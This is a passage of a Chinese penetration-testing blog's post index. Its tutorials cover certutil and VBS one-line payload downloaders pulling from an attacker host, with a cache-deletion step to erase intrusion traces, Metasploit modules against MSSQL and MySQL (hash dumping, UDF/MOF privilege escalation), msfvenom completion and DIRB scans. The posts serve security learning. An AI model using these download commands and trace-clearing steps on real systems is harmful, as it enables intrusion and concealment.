在没有其他参数的证书颁发机构上运行，则它将显示当前的证书颁发机构配置。 如果在非证书颁发机构上运行 certutil，则该命令默认为运行 certutil [-dump] 命令。 校验文件哈希值相关参数： -hashfile：生成并显示文件的加密哈希； 平时我们就有用到这个Windows自带的程序来校验文件的哈希值： 123certutil -hashfile xxx MD5certutil -hashfile xxx SHA1certutil -hashfile xxx SHA256 一句话下载payload相关参数： -urlcache：显示或删除URL缓存条目，其中delete指从当前用户的本地缓存中删除相关的URL； -split：拆分嵌入的node.js元素，并保存到文件； -f：强制覆盖； CertUtil一句话下载payload如下： 1certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt 但是certutil下载有个弊端，就是每一次下载都有留有缓存从而导致留下入侵痕迹，所以每次下载后需要进行马上执行如下命令： 1certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete 文件Base64加解密相关参数： -encode：将文件编码为Base64; -decode：对Base64编码的文件进行解码； Base64加密： 1234D:\\&gt;certutil -encode d:\\test.txt test.bat输入长度 = 7输出长度 = 70CertUtil: -encode 命令成功完成。 示例中加密生成的test.bat文件内容： 123-----BEGIN CERTIFICATE-----TWkxazdlYQ==-----END CERTIFICATE----- Base64解密： 1234D:\\&gt;certutil -decode test.bat new.txt输入长度 = 70输出长度 = 7CertUtil: -decode 命令成功完成。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"VBS一句话下载payload","date":"2021-02-27T05:39:37.000Z","path":"2021/02/27/VBS一句话下载payload/","text":"0x00 前言参考Micro8系列第三十七课：https://micro8.gitbook.io/micro8/contents-1/31-40/37vbs-yi-ju-hua-xia-zai-payload 参考Micro8系列第三十九课：https://micro8.gitbook.io/micro8/contents-1/31-40/39vbs-yi-ju-hua-xia-zai-payload-bu-chong 0x01 VBS一句话下载payload一次MSF完整的流程离不开目标机的payload下载与执行。而针对不同环境目标，考虑或者选择不同方式的payload下载与执行。如WebShell下、注入点下、smb 下等。而针对不同的实际环境，来做最好的选择。 在Windows环境下，无论是哪个版本都是支持VBS的。 优点：支持Windows全版本系列。 缺点：对HTTPS不友好。 上传方式写入VBS保存downfile.vbs： 1visual basic set a=createobject(\"adod\"+\"b.stream\"):set w=createobject(\"micro\"+\"soft.xmlhttp\"):w.open \"get\",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 命令行下执行： 1cscript downfile.vbs http://192.168.1.115/robots.txt C:\\Inetpub\\b.txt 但是在实战中，往往是没有上传的条件的，尤其是Windows，此时只能通过echo的方式来写入VBS。 echo方式写入VBS命令行下执行： 123echo set a=createobject(^\"adod^\"+^\"b.stream^\"):setw=createobject(^\"micro^\"+^\"soft.xmlhttp^\"):w.open^\"get^\",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofilewsh.arguments(1),2 &gt;&gt;downfile.vbs VBS参数化下载在实战中，可能遇到各种奇葩环境导致无法执行或者无法把下载参数带入其中，故补充VBS参数化的下载。 源码如下： 1visual basic strFileURL = \"http://192.168.1.115/robots.txt\" strHDLocation = \"c:\\test\\logo.txt\" Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") objXMLHTTP.open \"GET\", strFileURL, false objXMLHTTP.send() If objXMLHTTP.Status = 200 Then Set objADOStream = CreateObject(\"ADODB.Stream\") objADOStream.Open objADOStream.Type = 1 objADOStream.Write objXMLHTTP.ResponseBody objADOStream.Position = 0 Set objFSO = CreateObject(\"Scripting.FileSystemObject\") If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocati on Set objFSO = Nothing objADOStream.SaveToFile strHDLocation objADOStream.Close Set objADOStream = Nothing End if Set objXMLHTTP = Nothing","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"Tmux解决VPS的SSH掉线问题","date":"2021-02-27T05:38:34.000Z","path":"2021/02/27/Tmux解决VPS的SSH掉线问题/","text":"0x00 前言参考Micro8系列第三十六课：https://micro8.gitbook.io/micro8/contents-1/31-40/36-jie-jue-vps-shang-ssh-diao-xian 0x01 Tmux简介Tmux是一个优秀的终端复用软件（Terminal multiplexer），类似GNU Screen，但来自于OpenBSD，采用BSD授权。使用它最直观的好处就是，通过一个终端登录远程主机并运行Tmux后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机。是BSD实现的Screen替代品，相对于Screen，它更加先进：支持屏幕切分，而且具备丰富的命令行参数，使其可以灵活、动态的进行各种布局和操作。 会话与进程 命令行的典型使用方式是，打开一个终端窗口（terminal window，以下简称”窗口”），在里面输入命令。用户与计算机的这种临时的交互，称为一次”会话”（session） 。 会话的一个重要特点是，窗口与其中启动的进程是连在一起的。打开窗口，会话开始；关闭窗口，会话结束，会话内部的进程也会随之终止，不管有没有运行完。 一个典型的例子就是，SSH 登录远程计算机，打开一个远程窗口执行命令。这时，网络突然断线，再次登录的时候，是找不回上一次执行的命令的。因为上一次 SSH 会话已经终止了，里面的进程也随之消失了。 为了解决这个问题，会话与窗口可以”解绑”：窗口关闭时，会话并不终止，而是继续运行，等到以后需要的时候，再让会话”绑定”其他窗口。 Tmux 就是会话与窗口的”解绑”工具，将它们彻底分离。 它允许在单个窗口中，同时访问多个会话。这对于同时运行多个命令行程序很有用。 它可以让新窗口”接入”已经存在的会话。 它允许每个会话有多个连接窗口，因此可以多人实时共享会话。 它还支持窗口任意的垂直和水平拆分。 类似的终端复用器还有 GNU Screen。Tmux 与它功能相似，但是更易用，也更强大。 基本用法安装： 12345678# Ubuntu 或 Debian$ sudo apt-get install tmux# CentOS 或 Fedora$ sudo yum install tmux# Mac$ brew install tmux 安装完成后，键入tmux命令，就进入了 Tmux 窗口。 具体的Tmux用法参考：http://www.ruanyifeng.com/blog/2019/10/tmux.html 使用场景Tmux的使用场景如下： 当某个程序在执行时一直是输出状态，需要结合nohup、&amp;来放在后台执行，并且需要ctrl+c结束。这时可以打开一个Tmux窗口，在该窗口里执行这个程序用来保证该程序一直在执行中，只要Tmux这个窗口不关闭； 公司需要备份数据库时，由于数据量巨大，备份两三天弄不完，这时不小心关闭了终端窗口或误操作就前功尽弃了，使用Tmux会话运行命令或任务可以解决该问题； 下班后，需要断开SSH或关闭电脑，将运行的命令或任务放置后台运行； 关闭终端，再次打开时原终端里面的任务进程依然不会中断； 在渗透过程中，意外因网络等原因SSH掉线，Tmux可以恢复session会话； 常用操作命令 tmux new -s session1 新建会话 ctrl+b d 退出会话，回到shell的终端环境 //tmux detach-client tmux ls 终端环境查看会话列表 ctrl+b s 会话环境查看会话列表 tmux a -t session1 从终端环境进入会话 tmux kill-session -t session1 销毁会话 tmux rename -t old_session_name new_session_name 重命名会话 ctrl + b $ 重命名会话 (在会话环境中)","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"MSF联动Sqlmap（非session模式）","date":"2021-02-27T05:37:12.000Z","path":"2021/02/27/MSF联动Sqlmap（非session模式）/","text":"0x00 前言参考Micro8系列第三十五课：https://micro8.gitbook.io/micro8/contents-1/31-40/35-yu-sqlmap-jie-he-gong-ji 0x01 MSF联动Sqlmap（非session模式）MSF在非session模式下与session模式下都支持第三方的加载与第三方框架的融合。代表参数为load。两种模式下的load意义不同。 本次主要针对非session模式下的load sqlmap进行讲解。 在MSF中加载sqlmap并查看相关的命令： 1234567891011121314151617181920msf6 &gt; load sqlmap[*] Sqlmap plugin loaded[*] Successfully loaded plugin: Sqlmapmsf6 &gt; help sqlmapSqlmap Commands=============== Command Description ------- ----------- sqlmap_connect sqlmap_connect &lt;host&gt; [&lt;port&gt;] sqlmap_get_data Get the resulting data of the task sqlmap_get_log Get the running log of a task sqlmap_get_option Get an option for a task sqlmap_get_status Get the status of a task sqlmap_list_tasks List the knows tasks. New tasks are not stored in DB, so lives as long as the console does sqlmap_new_task Create a new task sqlmap_save_data Save the resulting data as web_vulns sqlmap_set_option Set an option for a task sqlmap_start_task Start the task MSF上的sqlmap插件依赖于sqlmap的sqlmapapi.py，在使用前需要启动sqlmapapi.py： 123456root@dde077eebdfc:/# sqlmapapi -s -p 8080[03:44:06] [INFO] Running REST-JSON API server at '127.0.0.1:8080'..[03:44:06] [INFO] Admin (secret) token: ebf9b14a44c4e745aa334cb85f222e7c[03:44:06] [DEBUG] IPC database: '/tmp/sqlmapipc-9kqmx9_b'[03:44:06] [DEBUG] REST-JSON API server connected to IPC database[03:44:06] [DEBUG] Using adapter 'wsgiref' to run bottle 然后在MSF上建立任务即可。 而sqlmap对MSF也完美支持。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"https://www.mi1k7ea.com/tags/Sqlmap/"}]},{"title":"MSF攻击MSSQL服务","date":"2021-02-27T05:36:15.000Z","path":"2021/02/27/MSF攻击MSSQL服务/","text":"0x00 前言参考Micro8系列第三十四课：https://micro8.gitbook.io/micro8/contents-1/31-40/34-gong-ji-sqlserver-fu-wu 0x01 MSF攻击MSSQL服务MSF中常用攻击MSSQL服务的模块如下： MSF模块 说明 auxiliary/admin/mssql/mssql_enum 非常详细的目标机MSSQL信息。 auxiliary/admin/mssql/mssql_enum_sql_logins 枚举sql logins，速度较慢，不建议使用。 auxiliary/admin/mssql/mssql_escalate_dbowner 发现dbowner，当sa无法得知密码时，或者需要其他账号提供来支撑下一步的内网渗透。 auxiliary/admin/mssql/mssql_exec 最常用模块之一，当没有激活xp_cmdshell，自动激活。并且调用执行cmd命令。权限继承SQL Server。 auxiliary/admin/mssql/mssql_sql 最常用模块之一，如果熟悉SQL Server数据库特性以及SQL语句，建议该模块，更稳定。 auxiliary/admin/mssql/mssql_sql_file 当需要执行多条SQL语句或者非常复杂的时候使用。MSF本身支持执行SQL文件。授权渗透应用较少，非授权应用较多的模块。 auxiliary/scanner/mssql/mssql_hashdump MSSQL的hash导出。如果熟悉SQL语句也可以用mssql_sql模块来执行。 auxiliary/scanner/mssql/mssql_login 内网渗透中的常用模块之一，支持RHOSTS，来批量发现内网MSSQL主机。MSSQL的特性除了此种方，还有其他方法来专门针对MSSQL主机发现，以后会提到。 auxiliary/scanner/mssql/mssql_ping 查询MSSQL实例，实战中应用较少，信息可能不准确。 exploit/windows/mssql/mssql_payload 非常好的模块之一，在实战中针对不同时间版本的系统都有着自己独特的方式来上传payload。 post/windows/manage/mssql_local_auth_bypass 后渗透模块，后面会讲到。 与MySQL不同的是，在SQL Server的模块中，一定要注意参数的配备以及payload的组合。否则无法反弹payload。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"}]},{"title":"MSF攻击MySQL服务","date":"2021-02-27T05:35:32.000Z","path":"2021/02/27/MSF攻击MySQL服务/","text":"0x00 前言参考Micro8系列第三十三课：https://micro8.gitbook.io/micro8/contents-1/31-40/33-gong-ji-mysql-fu-wu 0x01 MSF攻击MySQL服务MSF中常用攻击MySQL服务的模块如下： MSF模块 说明 auxiliary/scanner/mysql/mysql_login 常用于内网中的批量以及单主机的登录测试。 exploit/multi/mysql/mysql_udf_payload 常用于root启动的MySQL并root的UDF提权。 exploit/windows/mysql/mysql_mof 以上类似，MOF提权。 exploit/windows/mysql/scrutinizer_upload_exec 上传文件执行。 auxiliary/scanner/mysql/mysql_hashdump MySQL的mysql.user表的hash，而在实战中，mysql_hashdump这个插件相对其他较为少用。一般情况建议使用SQL语句： 更直观，更定制化 auxiliary/admin/mysql/mysql_sql 执行SQL语句，尤其是在目标机没有Web界面等无法用脚本执行的环境。 auxiliary/scanner/mysql/mysql_version 常用于内网中的批量mysql主机发现。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"}]},{"title":"VPS上安装配置MSF","date":"2021-02-27T05:34:02.000Z","path":"2021/02/27/VPS上安装配置MSF/","text":"0x00 前言参考Micro8系列第三十二课：https://micro8.gitbook.io/micro8/contents-1/31-40/32-pei-zhi-vps-shang-de-msf 0x01 VPS上安装配置MSF在实战中，一般都是以VPS为跳板做渗透，而VPS一般又是以Linux居多，因此本次主要以Linux为安装背景。 参考文章是用的Debian。 查看系统信息： 1234567891011root@john:~# uname -aLinux john 3.16.0-7-amd64 #1 SMP Debian 3.16.59-1 (2018-10-03) x86_64 GNU/Linuxroot@john:~# lsb_release -a No LSB modules are available. Distributor ID: DebianDescription: Debian GNU/Linux 8.11 (jessie)Release: 8.11 Codename: jessieroot@john:~# cat /proc/versionLinux version 3.16.0-7-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.59-1 (2018-10-03) 换源： 12345678910111213141516171819root@john:~# nano /etc/apt/sources.listroot@john:~# cat /etc/apt/sources.list ## deb cdrom:[Debian GNU/Linux 8.11.0 _Jessie_ - Official amd64 NETINST Binary-1 20180623-13:06]/ jessie main#deb cdrom:[Debian GNU/Linux 8.11.0 _Jessie_ - Official amd64 NETINST Binary-1 20180623-13:06]/ jessie maindeb http://http.us.debian.org/debian/ jessie main deb-src http://http.us.debian.org/debian/ jessie maindeb http://security.debian.org/ jessie/updates main deb-src http://security.debian.org/ jessie/updates main# jessie-updates, previously known as 'volatile'deb http://http.us.debian.org/debian/ jessie-updates main deb-src http://http.us.debian.org/debian/ jessie-updates main #deb http://http.kali.org/kali kali-rolling main non-free contrib#deb-src http://http.kali.org/kali kali-rolling main non-free contrib deb http://http.kali.org/kali kali-rolling main non-free contrib#deb http://http.kali.org/kali kali-rolling main non-free contrib 更新缓存： 12apt-get updateapt-get upgrade 安装MSF： 1apt-get install metasploit-framework 问题1——配置SSH： 12345678apt install sshnano /etc/ssh/sshd_config #PasswordAuthentication no //修改yes#PermitRootLogin yes //修改yesservice ssh start //重启/etc/init.d/ssh status //验证update-rc.d ssh enable //添加开机重启//运行ssh root登录#PermitRootLogin prohibit-password改为PermitRootLogin yes 问题2——更新源安装vmtools、文件头： 123456root@john:~# apt-get install open-vm-tools-desktop fuseroot@john:~#apt-cache search linux-headers //安装头文件root@john:~#apt-get install linux-image-4.9.0-kali3-amd64root@john:~#apt-get install linux-image-4.9.0 // root@john:~#apt-get install linux-headers-4.9.0-kali4-amd64 //重启root@john:~# apt-get install linux-headers-$(uname -r) //kali2.0以后vmtools不需要安装 问题3——安装各种VPN，然后重启网卡即可： 1apt-get install -y pptpd network-manager-openvpn network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome 问题4——Kali U盘安装不能挂载： df -m此时会看到挂载信息，最下面的是/dev/XXX /media，这个是U盘设备挂载到了/media，导致cd-rom不能被挂载。 umount /media上面那个国外的解决方案还要继续mount /dev/XXX /cd-rom，但本机测试不用自己挂载，安装程序会自己挂载。自己挂载反而会引起后面出现GRUB安装失败。 exit退出命令窗口后，返回之前的语言选择，继续安装，现在不会再出现cd-rom无法挂载的情况了，安装顺利完成 在VPS配置并更新好以上源时，按照项目或者任务在安装其他相关工具辅助。当不确定或者对某些工具遗忘时，可如下操作： 12apt-cache search kali-linuxapt-cache show kali-linux-web 安装配置zsh： 12345apt-get install zshsh -c \"\\$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"chsh -s `which zsh` //设置默认为zshcat /etc/shells //查看当前安装的shellecho $SHELL //查看当前使用shells 如果是VPS不建议安装oh-my-zsh，很多国外的VPS延迟较多，这里是配置zsh。 1wget https://raw.githubusercontent.com/skywind3000/vim/master/etc/zshrc.zsh 把下载的文件复制到~/.zshrc文件里保存，运行zsh即可。头一次运行会安装一些依赖包，稍等两分钟，以后再进入就OK了。 如果不能Tab补全： 1vim /root/.bashrc 到最后一行添加： 123if [ -f /etc/bash_completion ] &amp;&amp; ! shopt -oq posix; then ./etc/bash_completionfi 为MSF payload安装辅助框架： 1apt-get install veil-evasion","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"}]},{"title":"基于zsh扩展实现msfvenom命令自动补全","date":"2021-02-24T14:11:58.000Z","path":"2021/02/24/基于zsh扩展实现msfvenom命令自动补全/","text":"0x00 前言参考Micro8系列第三十课：https://micro8.gitbook.io/micro8/contents-1/21-30/30-jie-jue-msfvenom-ming-ling-zi-dong-bu-quan#xu-yao-zsh-de-zhi-chi 0x01 基于zsh扩展实现msfvenom命令自动补全msfvenom命令很强大，但是不足之处在于其参数较为复杂、且不支持自动补全，这样会影响渗透测试的效率，基于此来实现自动补全。 需要zsh支持： 123456789101112131415root@kali:/home/kali# cat /etc/shells # /etc/shells: valid login shells/bin/sh/bin/bash/usr/bin/bash/bin/rbash/usr/bin/rbash/bin/dash/usr/bin/dash/bin/zsh/usr/bin/zsh/usr/bin/tmux/usr/bin/screenroot@kali:/home/kali# echo $SHELL/bin/bash 重启终端即可成功切换到zsh： 12kali# echo $SHELL/bin/zsh 默认的zsh配置比较复杂麻烦但GitHub上已经有了一个配置文件oh-my-zsh，这是目前为止最流行的zsh配置：https://github.com/ohmyzsh/ohmyzsh 123456kali@kali:~$ git clone https://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zshCloning into '/home/kali/.oh-my-zsh'...remote: Enumerating objects: 25856, done.remote: Total 25856 (delta 0), reused 0 (delta 0), pack-reused 25856Receiving objects: 100% (25856/25856), 7.56 MiB | 916.00 KiB/s, done.Resolving deltas: 100% (12906/12906), done. 复制到~.zshrc中： 1kali@kali:~$ cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc 切换到zsh： 1kali@kali:~$ chsh -s /bin/zsh 接着，复制附录的内容到~/.oh-my-zsh/custom/plugins/msfvenom文件夹（若没有msfvenom文件夹的话创建即可）： 待补充… 0x02 附录123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393#compdef msfvenom#autoload## zsh completion for msfvenom in Metasploit Framework Project (https://www.metasploit.com)## github: https://github.com/Green‐m/msfvenom‐zsh‐completion## author: Green‐m (greenm.xxoo@gmail.com)## license: GNU General Public License v3.0## Copyright (c) 2018, Green‐m# All rights reserved.# VENOM_CACHE_FILE=~/.zsh/venom‐cache venom‐clear‐cache() &#123;rm $VENOM_CACHE_FILE&#125; venom‐cache‐payloads() &#123; if [ ‐x \"$(command ‐v msfvenom)\" ]thenVENOM=\"msfvenom\"elif [ ‐n \"$_comp_command1\" ]thenVENOM=$_comp_command1elseecho \"Cound not find msfvenom path in system env, please run msfvenom with path.\"fi if [[ ! ‐d $&#123;VENOM_CACHE_FILE:h&#125; ]]; thenmkdir ‐p $&#123;VENOM_CACHE_FILE:h&#125;fi if [[ ! ‐f $VENOM_CACHE_FILE ]]; thenecho ‐n \"(...caching Metasploit Payloads...)\"$VENOM ‐‐list payload|grep ‐e \"^.*\\/\" | awk '&#123;print $1&#125;' &gt;&gt;$VENOM_CA CHE_FILEfi&#125; _msfvenom() &#123; local curcontext=\"$curcontext\" state linetypeset ‐A opt_args _arguments ‐C \\'(‐h ‐‐help)'&#123;‐h,‐‐help&#125;'[show help]' \\'(‐l ‐‐list)'&#123;‐l,‐‐list&#125;'[List all modules for type. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all]' \\'(‐p ‐‐payload)'&#123;‐p,‐‐payload&#125;'[Payload to use (‐‐list payloads to list,‐‐list‐options for arguments). Specify ‐ or STDIN for custom]' \\'(‐‐list‐options)‐‐list‐options[List ‐‐payload &lt;value&gt; standard, advanced and evasion options]' \\'(‐f ‐‐format)'&#123;‐f,‐‐format&#125;'[Output format (use ‐‐list formats to list)]' \\'(‐e ‐‐encoder)'&#123;‐e,‐‐encoder&#125;'[The encoder to use (use ‐‐list encodersto list)]' \\'(‐‐smallest)‐‐smallest[Generate the smallest possible payload using allavailable encoders]' \\'(‐‐encrypt)‐‐encrypt[The type of encryption or encoding to apply to theshellcode (use ‐‐list encrypt to list)]' \\'(‐‐encrypt‐key)‐‐encrypt‐key[A key to be used for ‐‐encrypt]' \\'(‐‐encrypt‐iv)‐‐encrypt‐iv[An initialization vector for ‐‐encrypt]' \\'(‐a ‐‐arch)'&#123;‐a,‐‐arch&#125;'[the architecture to use for ‐‐payload and ‐‐encoders (use ‐‐list archs to list)]' \\'(‐‐platform)‐‐platform[The platform for ‐‐payload (use ‐‐list platfo rmsto list)]' \\'(‐o ‐‐out)'&#123;‐o,‐‐out&#125;'[Save the payload to a file]' \\'(‐b ‐‐bad‐chars)'&#123;‐b,‐‐bad‐chars&#125;'[Characters to avoid example: \"\\x00\\xff\"]' \\'(‐n ‐‐nopsled)'&#123;‐n,‐‐nopsled&#125;'[Prepend a nopsled of \\[length\\] size onto the payload]' \\'(‐‐encoder‐space)‐‐encoder‐space[The maximum size of the encoded payload (defaults to the ‐s value)]' \\'(‐i ‐‐iterations)'&#123;‐i,‐‐iterations&#125;'[The number of times to encode t hepayload]' \\'(‐c ‐‐add‐code)'&#123;‐c,‐‐add‐code&#125;'[Specify an additional win32 shellcodefile to include]' \\'(‐x ‐‐template)'&#123;‐x,‐‐template&#125;'[Specify a custom executable file to useas a template]' \\'(‐k ‐‐keep)'&#123;‐k,‐‐keep&#125;'[Preserve the ‐‐template behaviour and injectthe payload as a new thread]' \\'(‐v ‐‐var‐name)'&#123;‐v,‐‐var‐name&#125;'[Specify a custom variable name to usefor certain output formats]' \\'(‐t ‐‐timeout)'&#123;‐t,‐‐timeout&#125;'[The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)]' \\'*: :($(__msfvenom_options))' &amp;&amp; ret=0 lastword=$&#123;words[$&#123;#words[@]&#125;‐1]&#125; case \"$lastword\" in(‐p|‐‐payload)_values 'payload' $(__msfvenom_payloads);; (‐l|‐‐list)local lists=('payloads' 'encoders' 'nops' 'platforms' 'archs' 'encrypt''formats' 'all')_values 'list' $lists;; (‐encrypt)local encrypts=('aes256' 'base64' 'rc4' 'xor')_values 'encrypt' $encrypts;; (‐a|‐‐arch)_values 'arch' $(__msfvenom_archs);; (‐platform)_values 'platform' $(__msfvenom_platforms);;(‐f|‐‐format)_values 'format' $(__msfvenom_formats);;(‐e|‐‐encoder)_values 'encoder' $(__msfvenom_encoders);; (‐o|‐‐out|‐x|‐‐template|‐c|‐‐add‐code)_files;;(*);; esac&#125; __msfvenom_payloads()&#123;local msf_payloads # we cache the list of packages (originally from the macports plugin)venom‐cache‐payloadsmsf_payloads=`cat $VENOM_CACHE_FILE` for line in $msf_payloads; doecho \"$line\"done&#125; __msfvenom_archs()&#123;local archsarchs=('aarch64''armbe''armle''cbea''cbea64''cmd''dalvik''firefox''java''mips''mips64''mips64le''mipsbe''mipsle''nodejs''php''ppc''ppc64''ppc64le''ppce500v2''python''r''ruby''sparc''sparc64''tty''x64''x86''x86_64''zarch') for line in $archs; doecho \"$line\"done &#125; __msfvenom_encoders()&#123;local encodersencoders=('cmd/brace''cmd/echo''cmd/generic_sh''cmd/ifs''cmd/perl''cmd/powershell_base64''cmd/printf_php_mq''generic/eicar''generic/none''mipsbe/byte_xori''mipsbe/longxor''mipsle/byte_xori''mipsle/longxor''php/base64''ppc/longxor''ppc/longxor_tag''ruby/base64''sparc/longxor_tag''x64/xor''x64/xor_dynamic''x64/zutto_dekiru''x86/add_sub''x86/alpha_mixed''x86/alpha_upper''x86/avoid_underscore_tolower''x86/avoid_utf8_tolower''x86/bloxor''x86/bmp_polyglot''x86/call4_dword_xor''x86/context_cpuid''x86/context_stat''x86/context_time''x86/countdown''x86/fnstenv_mov''x86/jmp_call_additive''x86/nonalpha''x86/nonupper''x86/opt_sub''x86/service''x86/shikata_ga_nai''x86/single_static_bit''x86/unicode_mixed''x86/unicode_upper''x86/xor_dynamic')for line in $encoders; doecho \"$line\"done&#125; __msfvenom_platforms()&#123;local platformsplatforms=('aix''android''apple_ios''bsd''bsdi''cisco''firefox''freebsd''hardware''hpux''irix''java''javascript''juniper''linux''mainframe''multi''netbsd''netware''nodejs''openbsd''osx''php''python''r''ruby''solaris''unix''unknown''windows')for line in $platforms; doecho \"$line\"done&#125; __msfvenom_formats()&#123;local formatsformats=('asp''aspx''aspx‐exe''axis2''dll''elf''elf‐so''exe''exe‐only''exe‐service''exe‐small''hta‐psh''jar''jsp''loop‐vbs''macho''msi''msi‐nouac''osx‐app''psh''psh‐cmd''psh‐net''psh‐reflection''vba''vba‐exe''vba‐psh''vbs''war''bash''c''csharp''dw''dword''hex''java''js_be''js_le''num''perl''pl''powershell''ps1''py''python''raw''rb''ruby''sh''vbapplication''vbscript')for line in $formats; doecho \"$line\"done&#125; # For most common options, not accurately__msfvenom_options()&#123;local optionsoptions=(LHOST= \\LPORT= \\EXITFUNC= \\RHOST= \\StageEncoder= \\AutoLoadStdapi= \\AutoRunScript= \\AutoSystemInfo= \\AutoVerifySession= \\AutoVerifySessionTimeout= \\EnableStageEncoding= \\EnableUnicodeEncoding= \\HandlerSSLCert= \\InitialAutoRunScript= \\PayloadBindPort= \\PayloadProcessCommandLine= \\PayloadUUIDName= \\PayloadUUIDRaw= \\PayloadUUIDSeed= \\PayloadUUIDTracking= \\PrependMigrate= \\PrependMigrateProc= \\ReverseAllowProxy= \\ReverseListenerBindAddress= \\ReverseListenerBindPort= \\ReverseListenerComm= \\ReverseListenerThreaded= \\SessionCommunicationTimeout= \\SessionExpirationTimeout= \\SessionRetryTotal= \\SessionRetryWait= \\StageEncoder= \\StageEncoderSaveRegisters= \\StageEncodingFallback= \\StagerRetryCount= \\StagerRetryWait= \\VERBOSE= \\WORKSPACE=) echo $options&#125;#_msfvenom \"$@\"","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"}]},{"title":"DIRB工具笔记","date":"2021-02-24T13:34:48.000Z","path":"2021/02/24/DIRB工具笔记/","text":"0x00 前言参考Micro8系列第二十九课：https://micro8.gitbook.io/micro8/contents-1/21-30/30-jie-jue-msfvenom-ming-ling-zi-dong-bu-quan 0x01 DIRB简介DIRB官方地址： http://dirb.sourceforge.net/ 官方介绍： DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analizing the response. DIRB是一个基于命令行的工具，依据字典来爆破目标Web路径以及敏感文件，它支持自定义UA、Cookie、忽略指定响应码、支持代理扫描、自定义毫秒延迟、证书加载扫描等，是一款非常优秀的全方位的目录扫描工具。当然，Kali中内置了DIRB。 0x02 基本扫描12345678910111213141516171819202122root@John:~/wordlist/small# dirb http://192.168.1.102 ./ASPX.txt ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐DIRB v2.22By The Dark Raver‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ START_TIME: Sun Feb 17 23:26:52 2019URL_BASE: http://192.168.1.102/WORDLIST_FILES: ./ASPX.txt ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ GENERATED WORDS: 822 ‐‐‐‐ Scanning URL: http://192.168.1.102/ ‐‐‐‐+ http://192.168.1.102//Index.aspx (CODE:200|SIZE:2749)+ http://192.168.1.102//Manage/Default.aspx (CODE:302|SIZE:203) ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐END_TIME: Sun Feb 17 23:26:56 2019DOWNLOADED: 822 ‐ FOUND: 2 0x03 多字典挂载123456789101112131415161718192021222324252627282930313233root@John:~/wordlist/small# dirb http://192.168.1.102 ./ASPX.txt,./DIR.txt‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐DIRB v2.22By The Dark Raver‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ START_TIME: Sun Feb 17 23:31:02 2019URL_BASE: http://192.168.1.102/WORDLIST_FILES: ./ASPX.txt,./DIR.txt ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ GENERATED WORDS: 1975 ‐‐‐‐ Scanning URL: http://192.168.1.102/ ‐‐‐‐+ http://192.168.1.102//Index.aspx (CODE:200|SIZE:2749)+ http://192.168.1.102//Manage/Default.aspx (CODE:302|SIZE:203)+ http://192.168.1.102//bbs (CODE:301|SIZE:148)+ http://192.168.1.102//manage (CODE:301|SIZE:151)+ http://192.168.1.102//manage/ (CODE:302|SIZE:203)+ http://192.168.1.102//kindeditor/ (CODE:403|SIZE:218)+ http://192.168.1.102//robots.txt (CODE:200|SIZE:214)+ http://192.168.1.102//Web.config (CODE:302|SIZE:130)+ http://192.168.1.102//files 